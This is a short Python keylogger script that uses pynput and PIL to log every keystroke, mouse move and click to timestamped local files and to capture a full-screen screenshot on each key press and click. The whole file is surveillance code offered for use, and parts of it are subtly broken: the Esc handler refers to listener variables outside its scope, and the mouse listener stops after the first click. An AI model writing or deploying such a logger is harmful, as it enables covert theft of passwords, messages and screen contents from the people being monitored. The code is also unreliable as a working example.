from pynput import mouse, keyboard
from PIL import ImageGrab
import time


class KeyLogger():
    def __init__(self, filename: str = str(time.strftime('%H-%M-%S'))+"_keylogs.txt") -> None:
        self.filename = 'logs_text/'+filename

    def make_snap(self):
        snapshot = ImageGrab.grab()
        file_name = str(time.strftime('%H-%M-%S'))+".png"
        snapshot.save('logs_screens/'+file_name)

    def on_press(self, key):
        print("some press")
        self.make_snap()
        with open(self.filename, 'a') as logs:
            logs.write(str(time.strftime('%H-%M-%S'))+','+str(key)+'\n')

    def on_move(self, x, y):
        print("some move")
        with open(self.filename, 'a') as logs:
            logs.write(str(time.strftime('%H-%M-%S'))+', Pointer moved to '+ 'x: ' + str(x) + ', y:' +str(y) +'\n')

    def on_click(self, x, y, button, pressed):
        print("some click")
        self.make_snap()
        with open(self.filename, 'a') as logs:
            logs.write(str(time.strftime('%H-%M-%S'))+', Mouse click '+ 'x: ' + str(x) + ', y:' +str(y) + ', button: '+ str(button) +'\n')
        if not pressed:
            # Stop listener
            return False

    def on_release(self, key):
        if key == keyboard.Key.esc:
            # Stop listeners
            m_listener.stop()
            k_listener.stop()
            return False

    def main(self):
        with mouse.Listener(on_move=self.on_move, on_click=self.on_click) as m_listener, \
            keyboard.Listener(on_release=self.on_release, on_press=self.on_press,) as k_listener:  
                m_listener.run()
                k_listener.run()


if __name__ == '__main__':
    logger = KeyLogger()
    logger.main()
        
        
        